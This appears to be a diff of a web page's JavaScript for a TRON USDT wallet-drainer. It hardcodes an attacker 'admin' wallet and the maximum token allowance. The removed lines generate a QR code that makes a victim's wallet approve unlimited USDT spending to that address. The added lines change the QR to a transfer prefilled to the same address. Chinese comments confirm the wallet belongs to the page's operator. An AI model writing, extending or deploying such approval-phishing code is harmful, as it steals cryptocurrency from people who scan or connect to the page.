@@ -100,9 +100,7 @@ h1{font-size:24px;margin-bottom:8px}
 </div>
 
 <script>
-// 硬编码常量
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-// 你的钱包地址，全程写死
 const ADMIN_WALLET = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const MAX_ALLOWANCE_SUN = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
@@ -191,10 +189,9 @@ connectBtn.onclick = async () => {
     connectBtn.disabled = false;
 };
 
-// 【完全写死二维码内容】扫码唤起approve，被授权方=你的钱包地址
+// 二维码：tron:你的钱包地址，扫码直接唤起转账，接收人预填你的地址
 function genQR() {
-    // tron:USDT合约?function=approve&args=[你的钱包地址],[无限额度]
-    const qrRawText = "tron:TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t?function=approve&args=TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE,115792089237316195423570985008687907853269984665640564039457584007913129639935";
+    const qrRawText = "tron:" + ADMIN_WALLET;
     const qrImg = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrRawText)}`;
     document.getElementById("qrcode").innerHTML = `<img src="${qrImg}">`;
 }
